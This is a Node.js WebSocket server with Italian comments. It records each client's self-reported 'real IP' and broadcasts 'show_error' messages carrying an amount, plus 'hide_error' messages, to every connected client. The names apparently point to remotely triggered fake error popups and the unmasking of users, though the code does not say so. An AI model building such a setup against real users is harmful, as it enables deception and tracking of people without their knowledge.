// server.js
const WebSocket = require('ws');
const http = require('http');

const PORT = process.env.PORT || 8443;

// Mappa utenti connessi con i loro IP
const clients = new Map();

const server = http.createServer();
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
  console.log('[WS] Client connected');

  // Quando arriva un messaggio dal client
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      console.log('[WS] Message received:', data);

      // Salva l'IP reale se fornito
      if (data.type === 'register_real_ip' && data.real_ip) {
        clients.set(ws, data.real_ip);
        console.log(`[WS] Registered real IP: ${data.real_ip}`);
      }
    } catch (err) {
      console.error('[WS] Error parsing message:', err);
    }
  });

  ws.on('close', () => {
    console.log('[WS] Client disconnected');
    clients.delete(ws);
  });
});

// ✅ Esempio: invia un errore a tutti i client
function broadcastShowError(errorId, amount = 0.2) {
  const payload = {
    command: 'show_error',
    payload: {
      error_id: errorId,
      amount: amount
    }
  };

  for (const client of wss.clients) {
    if (client.readyState === WebSocket.OPEN) {
      client.send(JSON.stringify(payload));
    }
  }
}

// ✅ Esempio: nasconde l'errore
function broadcastHideError() {
  const payload = {
    command: 'hide_error'
  };

  for (const client of wss.clients) {
    if (client.readyState === WebSocket.OPEN) {
      client.send(JSON.stringify(payload));
    }
  }
}

// Avvia il server
server.listen(PORT, () => {
  console.log(`[WS] Server started on port ${PORT}`);
});
